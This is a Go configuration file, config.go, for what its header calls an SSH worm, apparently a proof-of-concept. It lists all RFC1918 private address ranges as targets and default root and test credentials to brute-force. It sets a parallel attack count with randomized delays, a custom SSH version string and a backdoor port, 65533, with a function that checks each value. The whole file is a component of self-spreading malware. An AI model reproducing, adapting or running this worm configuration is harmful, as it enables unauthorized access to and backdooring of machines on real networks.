package main

import (
	"fmt"
	"strings"
	"time"
)

/*
 * config.go
 * SSH worm configuration
 * By J. Stuart McMurray
 * Created 2016080
 * Last Modified 2016080
 */

/*****************
 * Configuration *
 *****************/
var targets = []string{
	/* Put target IP addresses, hostnames, or CIDR ranges here */

	/* RFC1918 ranges */
	"10.0.0.0/8",
	"172.16.0.0/12",
	"192.168.0.0/16",
}

/* Number of targets to attack in parallel */
var nParallel = 16

/* Delay between starting new attacks.  Mostly useful if nParallel is one and
slow rate of infection is desired.  This value will be randomly adjusted by
50% up or down per sleep, to add a bit of randomness. */
var delay = "1s"

/* Username / Password pairs to try */
var creds = []Credpair{
	{"root", "root"},
	{"root", "password"},
	{"root", "123456"},
	{"test", "test"},
}

/* SSH version string to send */
var sshversion = "SSH-2.0-sshpocworm"

/* bdport is the port on which the backdoor should listen */
var bdport = 65533

/***********************************************
 * No user-serviceable parts below this point. *
 ***********************************************/

/* Username / Password pairs */
type Credpair struct {
	Username string
	Password string
}

/* Global config struct */
type _config struct {
	Targets []string      /* Target list, may be CIDR ranges */
	Creds   []Credpair    /* Creds to try */
	Threads int           /* Number of targets to attack in parallel */
	Delay   time.Duration /* Per-thread delay between attacks */
	Version string        /* SSH version string */
	BDPort  int           /* Backdoor port */
}

var CONFIG _config

/* MakeConfig fills in the global Config struct */
func MakeConfig() error {
	var err error

	/* Target list */
	CONFIG.Targets = targets
	if 0 == len(CONFIG.Targets) {
		return fmt.Errorf("no targets specified")
	}

	/* Creds list */
	CONFIG.Creds = creds
	if 0 == len(CONFIG.Creds) {
		return fmt.Errorf("no username / password pairs specified")
	}

	/* Number of goroutines */
	CONFIG.Threads = nParallel
	if 0 >= CONFIG.Threads {
		return fmt.Errorf("need at least one attacker")
	}

	/* Delay between starts */
	if CONFIG.Delay, err = time.ParseDuration(delay); nil != err {
		return err
	}

	/* SSH version string */
	CONFIG.Version = sshversion
	if "" == CONFIG.Version {
		return fmt.Errorf("no SSH version string specified")
	}
	if !strings.HasPrefix(CONFIG.Version, "SSH-") {
		return fmt.Errorf("invalid SSH version string")
	}

	/* Backdoor Port */
	CONFIG.BDPort = bdport
	if 0 >= CONFIG.BDPort || 65535 < CONFIG.BDPort {
		return fmt.Errorf("invalid backdoor port")
	}

	return nil
}
